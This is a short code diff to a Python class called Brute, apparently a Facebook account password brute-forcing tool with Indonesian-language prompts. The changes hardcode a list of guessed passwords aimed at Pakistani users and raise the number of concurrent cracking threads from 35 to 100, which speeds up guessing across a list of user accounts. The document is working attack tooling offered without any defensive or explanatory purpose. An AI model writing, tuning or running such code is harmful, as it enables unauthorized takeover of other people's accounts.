@@ -87,7 +87,7 @@ class Brute:
                 prints('!m!Gunakan (,)(comma) untuk password selanjutnya contoh !k!sayang,doraemon,facebook,dll!p!', blank_left=4)
                 br(1)
                 while True:
-                    customPW = inputs('!p!Set password : !b!', blank_left=4).split(',')
+                    customPW = inputs('786786,Pakistan,pakistan786', blank_left=4).split(',')
                     if len(customPW) == 0 or customPW[0].strip() == '':
                         br(1)
                         prints('!m!Mohon isi password yang valid...', blank_left=4)
@@ -96,14 +96,14 @@ class Brute:
                     break
 
         br(1)
-        progressBar(text='loading...', max=35)
+        progressBar(text='loading...', max=100)
         th = Thread(target=self.crack, args=(threads, customPW))
         th.start()
         self.run()
         return self
 
     def crack(self, thread=0, customPW=[]):
-        with ThreadPoolExecutor(max_workers=35) as TH:
+        with ThreadPoolExecutor(max_workers=100) as TH:
             for user in self.user:
                 if len(customPW) == 0:
                     TH.submit(self.bruteAccount, (user['id']), (user['pw']))
